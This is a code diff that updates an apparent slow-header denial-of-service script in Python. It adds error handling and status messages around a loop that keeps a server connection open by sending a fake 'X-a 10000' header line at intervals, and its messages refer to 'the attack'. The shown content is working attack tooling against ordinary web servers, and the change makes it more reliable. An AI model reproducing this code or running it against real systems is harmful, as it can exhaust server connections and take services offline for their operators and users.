@@ -38,12 +38,32 @@ request = "\r\n".join(request)
 
 
 def main():
-    with socket.socket() as s:
+    s = socket.socket()
+    try:
         s.connect((args.ip, args.port))
+    except socket.error:
+        print("ERROR: server might be down, stopping attack")
+        s.close()
+        exit(1)
+    print(f"INFO: connected to {args.ip}:{args.port}")
+
+    try:
         s.sendall(str.encode(request))
-        while True:
-            s.send(b"X-a 10000\r\n")
-            time.sleep(args.time)
+    except socket.error:
+        print("ERROR: something went wrong with sending request")
+        s.close()
+        exit(1)
+    print("INFO: sending data...")
+
+    while True:
+        try:
+            s.sendall(b"X-a 10000\r\n")
+        except socket.error:
+            print("ERROR: something went wrong with sending request, exiting")
+            break
+        time.sleep(args.time)
+
+    s.close()
 
 
 if __name__ == "__main__":
